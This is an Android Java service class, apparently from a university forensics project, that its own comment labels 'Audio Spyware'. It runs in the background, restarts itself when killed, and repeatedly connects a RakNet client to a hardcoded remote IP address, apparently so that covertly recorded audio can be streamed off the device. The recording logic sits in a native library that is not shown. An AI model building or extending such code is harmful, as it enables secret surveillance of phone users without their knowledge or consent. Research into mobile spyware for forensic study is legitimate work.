package com.forensic.unipg.silenceaudiorecording;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.support.annotation.Nullable;

/**
 * Created by Gabriele on 30/05/16.
 */
public class SilenceAudioRecordingService extends Service
{
    static
    {
        System.load("libSilenceAudioRecordingNative.so");
    }

    //95.250.196.2
    //169.254.52.94
    //192.168.2.20
    //192.168.137.183
    //192.168.1.132
    //192.168.1.134
    private String mHost = "192.168.137.193";
    private int    mPort = 8000; //not implemented yet

    private Looper mServiceLooper;
    private ServiceHandler mServiceHandler;

    //network available
    private boolean isNetworkAvailable()
    {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    // Handler that receives messages from the thread
    private final class ServiceHandler extends Handler
    {
        public ServiceHandler(Looper looper)
        {
            super(looper);
        }

        @Override
        public void handleMessage(Message msg)
        {
            if(   RakClient.state() != RakClient.C_S_CONNECTED
               && RakClient.state() != RakClient.C_S_START
               && isNetworkAvailable()     )

            {
                //stop
                RakClient.stop();
                //re-try to restart
                RakClient.start(mHost);
            }
        }
    }

    @Override
    public void onCreate()
    {
        super.onCreate();
        // Start up the thread running the service.
        HandlerThread thread = new HandlerThread("ServiceStartArguments",  Process.THREAD_PRIORITY_BACKGROUND);
        thread.start();
        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper  = thread.getLooper();
        mServiceHandler = new ServiceHandler(mServiceLooper);
        //start RakNet client Audio Spyware
        RakClient.start(mHost);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        //send message
        Message msg = mServiceHandler.obtainMessage();
        msg.arg1 = startId;
        mServiceHandler.sendMessage(msg);
        // If we get killed, after returning from here, restart
        return START_STICKY;
    }


    @Override
    public void onDestroy()
    {
        RakClient.stop();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

}
